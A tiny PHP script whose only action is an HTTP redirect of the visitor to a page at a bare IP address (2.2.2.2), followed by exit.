<?php
header('Location: http://2.2.2.2/cermatisms/index.php');
exit;
?>
